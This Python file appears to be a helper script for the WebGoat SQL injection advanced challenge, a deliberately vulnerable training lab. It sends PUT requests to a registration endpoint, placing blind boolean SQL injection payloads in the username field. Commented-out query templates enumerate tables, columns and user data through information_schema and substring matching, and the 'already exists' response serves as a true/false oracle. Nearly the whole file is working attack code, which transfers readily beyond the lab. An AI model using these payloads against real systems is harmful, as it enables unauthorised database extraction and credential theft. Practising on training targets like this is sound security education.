import requests
import json

from res import URL


def check(cookie="", query=""):
    headers = {
        'Cookie': cookie,
    }

    #userid
    # query = f'tom\' and exists (select {column_name} from {table_name} where ' \
    #         f'{column_name}=\'{user_id}\')--'

    #column
    # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
    # f'and column_name= \'{column_name}\')--'
    print(query)
    #table
    # table_query = f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
    #               f'table_name = \'{table_name}\')--'
    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123'
    }

    r = requests.put('http://172.17.0.2:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers,
                     data=data)

    try:
        response = json.loads(r.text)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if "already exists please try to register with a different username" not in response['feedback']:
        return False
    else:
        return True


def inject(table_name="", column_name="", cookie="", query=""):
    headers = {
        'Cookie': cookie,
    }

    # users
    # query = f'tom\' and exists (select {column_name} from {table_name} where ' \
    #         f'substring({column_name},1, {length})=\'{word}\')--'
    # columns
    # query = f'tom\' and exists (select * from information_schema.columns where table_name=\'{table_name}\' ' \
    # f'and substring(column_name,1,{length})=\'{word}\')--'

    # query = f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
    #               f'SUBSTRING(table_name, 1, {length})=\'{word}\')--'
    print(query)
    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123'
    }

    r = requests.put(URL, headers=headers, data=data)

    try:
        response = json.loads(r.text)
        # print(response)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if "already exists please try to register with a different username" not in response['feedback']:
        return False
    else:
        return True
